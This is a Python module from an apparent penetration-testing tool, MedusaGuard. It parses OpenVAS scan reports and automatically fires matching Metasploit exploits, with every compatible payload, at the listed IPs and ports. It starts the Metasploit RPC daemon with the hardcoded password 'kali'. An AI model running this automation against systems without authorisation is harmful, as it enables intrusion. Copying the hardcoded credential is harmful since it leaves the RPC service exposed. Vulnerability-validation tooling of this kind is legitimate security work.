import csv
import subprocess
import time
import os
from datetime import datetime
from pymetasploit3.msfrpc import MsfRpcClient
from termcolor import colored
from logger import logger

"""
MedusaGuard Exploitation Module

This module is responsible for processing OpenVAS CSV reports, identifying exploitable CVEs,
connecting to the Metasploit RPC server, executing corresponding exploits, and generating detailed
exploitation reports. The module leverages the Metasploit Framework to automate the exploitation
process based on the vulnerabilities identified in the OpenVAS scans.

Usage:
------
To execute the exploitation workflow, call the `run_exploit_module` function with the path to
the OpenVAS CSV report.

Example:
    run_exploit_module("path/to/openvas_report.csv")
"""

# Global Variables
connectest = False  # Indicates if the connection to Metasploit RPC server is established
connectfail = "Connection to the Metasploit RPC server has failed. Attempting again in 10 seconds."
exploitedcves = 0
incompatiblecves = 0
noexploitcve = 0  # Counter for CVEs without corresponding Metasploit exploits
nxcvelist = ["0"]
rowcounter = 0
report = None  # Will hold the report file object
report_csv = None  # Will hold the CSV file object
csv_writer = None  # Will be used to write rows to the CSV file


def cveexploitation(noexploitcve, nxcvelist, targetcve, targetip, targetport, client):
    """
    Searches for Metasploit exploits corresponding to the provided CVEs and attempts to execute them.

    Args:
        noexploitcve (int): Current count of CVEs without exploits.
        nxcvelist (list): List of CVEs without available exploits.
        targetcve (list): List of CVEs to exploit.
        targetip (str): Target IP address.
        targetport (int): Target port number.
        client (MsfRpcClient): Connected Metasploit RPC client.

    Returns:
        tuple: Updated (noexploitcve, nxcvelist) after processing the CVEs.
    """
    global exploitedcves, csv_writer

    for cve in targetcve:
        # Log searching for Metasploit exploits
        logger.info(f"Searching for Metasploit exploits for CVE: {cve}")
        cvematch = client.modules.search(f"type:exploit cve:{cve}")
        payloadfail = 0  # Number of payloads that failed
        payloadpass = 0  # Number of payloads that succeeded

        # Retrieve ExploitDB results for this CVE
        expdbres = subprocess.run(["searchsploit", "--cve", cve],
                                  shell=False, check=True, capture_output=True, text=True)
        expdb_output = expdbres.stdout.strip() if expdbres.stdout else "No ExploitDB entries found."

        if cvematch:
            exploitname = cvematch[0].get("fullname")
            print(
                colored("[ALERT] ", "red")
                + f"Found exploit: {exploitname} for CVE: {cve}"
            )
            logger.info(f"Found exploit: {exploitname} for CVE: {cve}")
            exploit = client.modules.use("exploit", exploitname)
            exploit["RHOSTS"] = targetip
            exploit["RPORT"] = targetport
            compatpayloads = exploit.targetpayloads()
            exploitedcves += 1

            # Write exploit details to report and CSV
            report.write(
                "---------------------------------------- \n"
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Exploitable CVE Found: {cve}\n"
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Identified Exploit: {exploitname}\n"
                f"Target IP: {targetip}\n"
                f"Target Port: {targetport}\n"
                "\n"
            )

            for payload in compatpayloads:
                logger.info(f"Attempting payload: {payload}")
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                try:
                    exploit.execute(payload=payload)
                except ValueError:
                    logger.info(
                        f"Payload {payload} is incompatible with exploit {exploitname}"
                    )
                    payloadfail += 1
                    # Write fail attempt to CSV
                    csv_writer.writerow([timestamp, cve, targetip, targetport, exploitname, payload, "failed"])
                else:
                    logger.info(f"Payload {payload} executed successfully")
                    payloadpass += 1
                    # Write successful attempt to CSV
                    csv_writer.writerow([timestamp, cve, targetip, targetport, exploitname, payload, "success"])

            payloadtotal = payloadpass + payloadfail

            # Write exploitation results to report
            report.write(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Exploitation completed. \n"
                f"Payload Statistics: \n"
                f"Total: {payloadtotal}\n"
                f"Successful: {payloadpass}\n"
                f"Failed: {payloadfail}\n"
                "\n"
                "Detections in ExploitDB:\n\n"
                f"{expdb_output}\n"
                "---------------------------------------- \n \n"
            )
            print(
                colored("[INFO] ", "cyan")
                + f"Exploitation of CVE {cve} completed. Successful: {payloadpass}, Failed: {payloadfail}"
            )
            logger.info(
                f"Exploitation of CVE {cve} completed. Successful: {payloadpass}, Failed: {payloadfail}"
            )
        else:
            # For CVEs with no Metasploit exploit found
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(
                colored("[INFO] ", "cyan")
                + f"No Metasploit exploit found for CVE: {cve}"
            )
            logger.info(f"No Metasploit exploit found for CVE: {cve}")
            noexploitcve += 1
            nxcvelist.append(cve)
            # Write a row to CSV indicating no exploit found
            csv_writer.writerow([timestamp, cve, targetip, targetport, "No Metasploit Exploit Found", "", "N/A"])

    return noexploitcve, nxcvelist


def openvasread(rowcounter, csv_path, client):
    """
    Reads the OpenVAS CSV report and processes each row to identify and exploit CVEs.

    Args:
        rowcounter (int): Current count of processed rows.
        csv_path (str): Path to the OpenVAS CSV report.
        client (MsfRpcClient): Connected Metasploit RPC client.

    Returns:
        tuple: Updated (rowcounter, noexploitcve, nxcvelist) after processing the CSV.
    """
    global noexploitcve, nxcvelist

    print(
        colored("[INFO] ", "cyan")
        + "Reading OpenVAS CSV report from: "
        + colored(f"{csv_path}", attrs=["bold"])
    )
    logger.info(f"Reading OpenVAS csv report from: {csv_path}")
    try:
        with open(csv_path, "r") as csvfile:
            openvasresults = csv.DictReader(csvfile)
            report.write(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] OpenVAS report opened and read successfully \n"
            )
            print(
                colored("[INFO] ", "cyan")
                + "OpenVAS report opened and read successfully."
            )
            logger.info("OpenVAS csv report read successfully")

            for row in openvasresults:
                rowcounter += 1
                if row["CVEs"]:
                    targetip = row["IP"]
                    targetport = row["Port"]
                    targetcve = row["CVEs"].split(",")
                    logger.info(
                        f"Processing row {rowcounter}: IP={targetip}, Port={targetport}, CVEs={targetcve}"
                    )
                    noexploitcve, nxcvelist = cveexploitation(
                        noexploitcve, nxcvelist, targetcve, targetip, targetport, client
                    )
                else:
                    logger.info(f"No CVEs found on row {rowcounter}. Skipping.")
    except FileNotFoundError:
        print(colored("[ERROR] ", "red") + f"CSV file not found: {csv_path}")
        logger.error(f"CSV file not found: {csv_path}")
    except Exception as e:
        print(colored("[ERROR] ", "red") + f"Error reading CSV file: {e}")
        logger.error(f"Error reading CSV file: {e}")

    return rowcounter, noexploitcve, nxcvelist


def reportcreation():
    """
    Creates and initialises the exploitation report file in the 'metasploit_results' directory.

    The report file includes headers indicating the start of the exploitation suite.
    """
    global report, report_csv, reportname, csv_writer

    report_dir = "metasploit_results"

    # Get the absolute path of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    report_dir_absolute = os.path.join(script_dir, report_dir)
    os.makedirs(report_dir_absolute, exist_ok=True)

    # Create the report filename with the desired directory
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    reportname = os.path.join(
        report_dir_absolute,
        f'MedusaGuard_Exploit_Report_{current_time}.txt',
    )
    csv_reportname = os.path.join(
        report_dir_absolute,
        f'MedusaGuard_Exploit_Report_{current_time}.csv',
    )

    try:
        report = open(reportname, "w")
        print(
            colored("[INFO] ", "cyan")
            + f"Created report file: "
            + colored(f"{reportname}", attrs=["bold"])
        )
        report.write(
            "Commencing MedusaGuard Exploitation component. \n"
            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Start time of exploitation suite \n \n \n \n"
        )
    except Exception as e:
        print(colored("[ERROR] ", "red") + f"Failed to create report file: {e}")

    # Create and initialize the CSV report
    try:
        report_csv = open(csv_reportname, mode='w', newline='')
        csv_writer = csv.writer(report_csv)
        csv_writer.writerow(["Timestamp", "CVE", "Target IP", "Target Port", "Exploit Name", "Payload Name", "Payload Result"])
        print(
            colored("[INFO] ", "cyan")
            + f"Created CSV report file: "
            + colored(f"{csv_reportname}", attrs=["bold"])
        )
        logger.info(f"CSV report file created: {csv_reportname}")
    except Exception as e:
        print(colored("[ERROR] ", "red") + f"Failed to create CSV report file: {e}")


def reportfinalise(incompatiblecves, exploitedcves, nxcvelist):
    """
    Finalises the exploitation report by summarising the results and listing CVEs without exploits.

    Args:
        incompatiblecves (int): Number of CVEs without compatible payloads.
        exploitedcves (int): Number of successfully exploited CVEs.
        nxcvelist (list): List of CVEs without available exploits.
    """
    global report, report_csv, csv_writer

    print(colored("[INFO] ", "cyan") + "Finalizing report...")

    # Remove duplicates from nxcvelist
    unique_nxcvelist = list(dict.fromkeys(nxcvelist))  # Preserves order but removes duplicates
    if len(unique_nxcvelist) > 1:
        # Remove the initial placeholder "0"
        del unique_nxcvelist[0]

    if len(unique_nxcvelist) > 0:
        # Write information about CVEs without exploits in the text report
        report.write(
            "The following CVEs were detected, but Metasploit does not have an exploit to target these. \n"
            "Search results from ExploitDB have been included for each CVE. \n"
        )

        for nxcve in unique_nxcvelist:
            nxexpdbres = subprocess.run(["searchsploit", "--cve", nxcve], shell=False, check=True, capture_output=True,
                                        text=True)
            nxexpdb_output = nxexpdbres.stdout.strip() if nxexpdbres.stdout else "No ExploitDB entries found."

            report.write(f"\n{nxcve}\n")
            report.write("Detections in ExploitDB:\n")
            report.write(f"{nxexpdb_output}\n")

    totalcves = int(incompatiblecves) + int(exploitedcves)
    report.write(
        "\n"
        "End of Report Summary \n"
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] End time of exploitation suite \n"
        f"Total CVEs examined: {totalcves}\n"
        f"Total exploited CVEs: {exploitedcves}\n"
        f"Incompatible CVEs: {incompatiblecves}\n"
    )
    report.close()

    # Write a summary row to the CSV (optional summary row)
    if csv_writer:
        csv_writer.writerow([])
        csv_writer.writerow(["Summary"])
        csv_writer.writerow(["Total CVEs examined: ", totalcves])
        csv_writer.writerow(["Total exploited CVEs: ", exploitedcves])
        csv_writer.writerow(["Incompatible CVEs: ", incompatiblecves])

    if report_csv:
        report_csv.close()
    print(
        colored("[INFO] ", "cyan")
        + f"Metasploit report finalized and saved as "
        + colored(f"{reportname}", attrs=["bold"])
    )
    logger.info(f"Metasploit report created and saved to {reportname}")


def rpcconnect(connectest, connectfail):
    """
    Attempts to establish a connection to the Metasploit RPC server. Retries every 10 seconds upon failure.

    Args:
        connectest (bool): Current connection status.
        connectfail (str): Message to display upon connection failure.
    """
    global client

    while not connectest:
        try:
            print(
                colored("[INFO] ", "cyan")
                + "Attempting to connect to Metasploit RPC server..."
            )
            client = MsfRpcClient("kali", port=55553, ssl=True)
        except Exception as e:
            print(colored("[ERROR] ", "red") + f"{connectfail}: {e}")
            if report:
                report.write(
                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Connection failed: {e}\n"
                )
                logger.error("Connection to Metasploit RPC server failed")
            time.sleep(10)
        else:
            print(
                colored("[INFO] ", "cyan")
                + "Successfully connected to Metasploit RPC server."
            )
            logger.info("Successfully connected to Metasploit RPC server")
            if report:
                report.write(
                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Successfully connected to Metasploit RPC server \n \n \n \n"
                )
            connectest = True


def run_exploit_module(csv_path):
    """
    Executes the exploitation module workflow, which includes creating a report, starting the Metasploit RPC daemon,
    connecting to the RPC server, processing the OpenVAS CSV report, and finalizing the exploitation report.

    Args:
        csv_path (str): Path to the OpenVAS CSV report.
    """
    global connectest, connectfail, exploitedcves, incompatiblecves, noexploitcve, nxcvelist, rowcounter

    # Initialize counters
    connectest = False
    connectfail = "Connection to the Metasploit RPC server has failed. Attempting again in 10 seconds."
    exploitedcves = 0
    incompatiblecves = 0
    noexploitcve = 0
    nxcvelist = ["0"]
    rowcounter = 0

    # Create and initialize reports (text and CSV)
    reportcreation()

    # Start Metasploit RPC daemon
    try:
        print(colored("\n>>> Metasploit Exploitation", attrs=["bold"]))
        print(
            colored("[INFO] ", "cyan") + "Starting Metasploit RPC daemon (msfrpcd)..."
        )
        logger.info("Starting Metasploit RPC daemon")
        # Correct usage with shell=False and a list of arguments
        subprocess.run(["msfrpcd", "-P", "kali"], shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(colored("[ERROR] ", "red") + f"Failed to start msfrpcd: {e}")
        logger.error(f"Failed to start msfrpc: {e}")
        if report:
            report.write(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Failed to start msfrpcd: {e}\n"
            )
        return

    # Establish RPC connection
    rpcconnect(connectest, connectfail)

    # Read and process OpenVAS CSV report
    rowcounter, noexploitcve, nxcvelist = openvasread(rowcounter, csv_path, client)

    # Ensuring placeholder "0" does not count if present
    unique_nxcvelist = list(dict.fromkeys(nxcvelist))  # Remove duplicates
    if "0" in unique_nxcvelist:
        unique_nxcvelist.remove("0")
    incompatiblecves = len(unique_nxcvelist)
    # Finalize the report
    reportfinalise(incompatiblecves, exploitedcves, nxcvelist)

    print(
        colored("[INFO] ", "cyan")
        + "Exploitation process completed. Report saved as "
        + colored(f"{reportname}", attrs=["bold"])
    )
    logger.info("Exploitation process completed")

    return exploitedcves, incompatiblecves, reportname  # Return the counts
